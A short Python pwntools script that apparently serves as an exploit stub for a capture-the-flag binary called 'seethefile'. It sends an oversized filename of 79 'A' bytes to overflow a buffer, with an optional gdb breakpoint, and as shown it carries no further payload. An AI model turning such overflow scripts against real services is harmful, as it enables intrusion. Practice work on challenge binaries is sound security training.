#!/usr/bin/env python3
from pwn import *

elf = ELF("./given/seethefile")
context.arch = "i386"

if args.REMOTE:
    p = remote("")
else:
    p = process([elf.path])
    if args.D:
        gdb.attach(p, "b *openfile + 93")

def openfile(filename):
    p.sendlineafter(b"Your choice :", b"1")
    p.sendlineafter(b"What do you want to see :", filename)

def exploit():
    payload = b"A" * (63+16)
    openfile(payload)
    p.interactive()


if __name__ == "__main__":
    exploit()


